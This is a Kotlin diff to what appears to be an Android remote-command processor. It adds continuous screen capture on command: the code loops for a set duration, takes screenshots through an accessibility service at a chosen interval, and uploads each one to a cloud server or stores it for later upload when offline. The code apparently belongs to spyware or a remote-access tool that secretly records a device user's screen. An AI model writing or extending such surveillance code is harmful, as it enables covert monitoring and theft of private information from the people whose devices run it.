@@ -365,25 +365,58 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                         errorMsg = "Accessibility service is required for screenshots."
                     } else {
-                        val quality = content.trim().toIntOrNull() ?: 70
-                        val deferredFile = CompletableDeferred<java.io.File?>()
-                        
-                        MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
-                            deferredFile.complete(file)
-                        }
+                        val parts = content.split("|")
+                        val quality = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 70
+                        val freq = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 0
+                        val duration = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 0
 
-                        val file = withTimeoutOrNull(10000) { deferredFile.await() }
-                        if (file != null) {
-                            if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
-                                status = "SCREENSHOT_UPLOADED"
-                                file.delete()
-                            } else {
-                                DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
-                                status = "SCREENSHOT_QUEUED_OFFLINE"
+                        if (freq > 0 && duration > 0) {
+                            val safeFreq = if (freq < 2) 2 else freq
+                            val endTime = System.currentTimeMillis() + (duration * 1000L)
+                            var capturedCount = 0
+                            
+                            DebugLogger.log("SCREEN_SESSION", "Starting continuous capture: ${safeFreq}s interval for ${duration}s")
+                            
+                            while (System.currentTimeMillis() < endTime) {
+                                val deferredFile = CompletableDeferred<java.io.File?>()
+                                MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
+                                    deferredFile.complete(file)
+                                }
+
+                                val file = withTimeoutOrNull(8000) { deferredFile.await() }
+                                if (file != null) {
+                                    if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
+                                        file.delete()
+                                    } else {
+                                        DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
+                                    }
+                                    capturedCount++
+                                }
+                                
+                                if (System.currentTimeMillis() + (safeFreq * 1000L) > endTime) break
+                                delay(safeFreq * 1000L)
                             }
+                            status = "SCREENSHOT_SESSION_COMPLETE ($capturedCount images)"
                         } else {
-                            status = "SCREENSHOT_FAILED"
-                            errorMsg = "Capture timed out or device version incompatible."
+                            // Single Shot Logic
+                            val deferredFile = CompletableDeferred<java.io.File?>()
+                            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
+                                deferredFile.complete(file)
+                            }
+
+                            val file = withTimeoutOrNull(10000) { deferredFile.await() }
+                            if (file != null) {
+                                if (CloudManager.uploadFile(ctx, file, "SCREEN_CAPTURE")) {
+                                    status = "SCREENSHOT_UPLOADED"
+                                    file.delete()
+                                } else {
+                                    DumpManager.vaultMedia(file, "SCREEN_CAPTURE")
+                                    status = "SCREENSHOT_QUEUED_OFFLINE"
+                                }
+                            } else {
+                                status = "SCREENSHOT_FAILED"
+                                errorMsg = "Capture timed out or device version incompatible."
+                            }
                         }
                     }
                 }
